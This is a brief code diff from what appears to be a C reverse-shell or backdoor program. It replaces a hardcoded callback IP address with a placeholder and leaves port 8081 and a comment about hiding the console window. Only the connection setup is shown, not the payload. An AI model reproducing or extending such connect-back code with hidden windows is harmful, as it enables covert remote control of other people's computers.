@@ -34,7 +34,7 @@ void MooveExe() {
 
 int main(int argc, char** argv) {
 	//FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "51.75.30.35"; // ip to connect to
+	char rhost[] = "XXXXX"; // ip to connect to
 	int rport = 8081;
 		
 
